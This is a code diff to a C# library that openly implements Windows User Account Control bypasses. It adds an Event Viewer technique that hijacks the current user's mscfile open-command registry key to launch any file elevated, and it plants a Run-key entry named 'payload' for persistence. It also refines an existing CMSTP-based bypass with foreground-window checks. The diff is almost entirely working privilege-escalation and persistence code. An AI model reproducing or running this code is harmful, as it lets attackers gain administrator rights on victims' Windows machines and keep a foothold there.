@@ -19,7 +19,7 @@ namespace UACBypass
         /// <returns>
         /// Return True if the current configuration of the User Account Control (UAC) allows a privilege escalation.
         /// </returns>
-        public static bool canBypassUAC()
+        public static bool CanBypassUAC()
         {
             string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
             string enableLUA = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("EnableLUA").ToString();
@@ -78,7 +78,38 @@ namespace UACBypass
         }
     }
 
-    
+    public static class EVENTVWRBypass
+    {
+        public static bool AutoElevate(string filename)
+        {
+            if (Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
+
+            if (!UAC.CanBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
+
+            if (!File.Exists(filename)) throw new FileNotFoundException("The system cannot find the specified file.");
+
+
+            Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").SetValue("", filename);
+            Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("payload", filename);
+            System.Threading.Thread.Sleep(2000);
+
+            Process.Start("eventvwr.exe");
+
+            return true;
+        }
+
+
+        public static void CleanRegistry()
+        {
+            try
+            {
+                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").DeleteValue("");
+                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue("payload");
+            }
+            catch(Exception) { }
+        }
+    }
+
     public static class CMSTPBypass
     {
         // Our .INF file data!
@@ -110,6 +141,36 @@ namespace UACBypass
         [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
         [DllImport("user32.dll")] private static extern bool IsWindowVisible(int hWnd);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
+        /// <summary>Returns true if the current application has focus, false otherwise</summary>
+        public static bool WindowIsInForeground()
+        {
+            var activatedHandle = GetForegroundWindow();
+            if (activatedHandle == IntPtr.Zero)
+            {
+                return false;       // No window is currently activated
+            }
+
+            var procId = GetProcessId("cmstp");
+            int activeProcId;
+            GetWindowThreadProcessId(activatedHandle, out activeProcId);
+
+            return activeProcId == (int)procId;
+        }
+
+        private static int GetProcessId(string name)
+        {
+            Process[] ps = Process.GetProcessesByName(name);
+            foreach (Process p in ps)
+            {
+                return p.Id;
+            }
+
+            return 0;
+        }
 
         public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
@@ -148,7 +209,7 @@ namespace UACBypass
         /// <exception cref="InvalidUACConfigurationException">Thrown if the current configuration of the User Account Control (UAC)
         /// is not supported by this method.</exception>
         /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
-        public static bool autoElevate(string CommandToExecute)
+        public static bool AutoElevate(string CommandToExecute)
         {
             if (!File.Exists(BinaryPath))
             {
@@ -157,7 +218,7 @@ namespace UACBypass
 
             if(Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
 
-            if (!UAC.canBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
+            if (!UAC.CanBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
 
             if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");
 
@@ -178,7 +239,7 @@ namespace UACBypass
             do
             {
                 windowHandle = SetWindowActive("cmstp");
-            } while (windowHandle == IntPtr.Zero);
+            } while (windowHandle == IntPtr.Zero && !WindowIsInForeground());
 
             do
             {
